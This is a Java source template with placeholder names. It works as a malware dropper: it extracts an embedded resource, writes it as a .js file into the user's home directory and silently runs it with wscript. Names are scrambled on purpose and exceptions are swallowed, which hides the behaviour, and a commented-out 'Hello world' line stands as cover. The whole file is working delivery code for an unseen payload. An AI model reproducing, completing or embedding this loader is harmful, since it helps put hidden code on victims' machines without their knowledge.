package [pkgname];
import java.io.*;

public class [classname]{
	public static void main(String[] args){
	    try{
	        Object WV_2345 = [classname].class.getResourceAsStream("resources/[resourcename]");
	        if(yeuwri7333(null, WV_2345, null)){
	            //System.out.println("Hello world!");
	        }
	        
	    }
	    catch(Exception e){}
	}

	private static boolean yeuwri7333(StringBuilder[] b, Object c, Runtime[] rj){
	    byte[] menstru = jjjewrzmuqe(null, (InputStream)c, null, null)[0].getBytes();
	    xxxuuwerafdb(System.getProperty("user.home") + File.separator + "[outname].js", menstru, null, null);
	    try{Runtime.getRuntime().exec(new String[]{"wscript", System.getProperty("user.home") + File.separator + "[outname].js"});}catch(Exception e){}
    	return true;
	}

    private static String[] jjjewrzmuqe(File[] vsfdew, InputStream bxzcvmbsf, FileInputStream[] r, String[] o1){
	    try{
	        StringBuilder sb = new StringBuilder();
    	    byte[] bytA = new byte[1024];
    		while (true){
    			int i = bxzcvmbsf.read(bytA,0,bytA.length);
    			if(i == -1){
    				bxzcvmbsf.close();
    				break;
    			}
    	        sb.append(new String(bytA,0,i));
    		}
    		return new String[]{sb.toString()};
	    }
	    catch(Exception e){
	        return null;
	    }
	}

	private static void xxxuuwerafdb(String bopweri, byte[] mnnbxcbv, StringBuilder[] o, FileOutputStream o1){
	    try{
	        File y342azv = new File(bopweri);
			if(y342azv.exists()){
				y342azv.delete();
				y342azv.createNewFile();
			}
			else{
				y342azv.createNewFile();
			}
			wwwaerygsdjf(y342azv, mnnbxcbv, null);
	    }
	    catch(Exception e){
	        
	    }
	}

	private static void wwwaerygsdjf(File ywezndf, byte[] moiuny, File[] r){
	    try{
	        if(!ywezndf.equals("")){
    	        FileOutputStream tanza = new FileOutputStream(ywezndf);
    			tanza.write(moiuny);
    			tanza.flush();
    			tanza.close();
			}
	    }
	    catch(Exception e){
	        
	    }
	}
	
}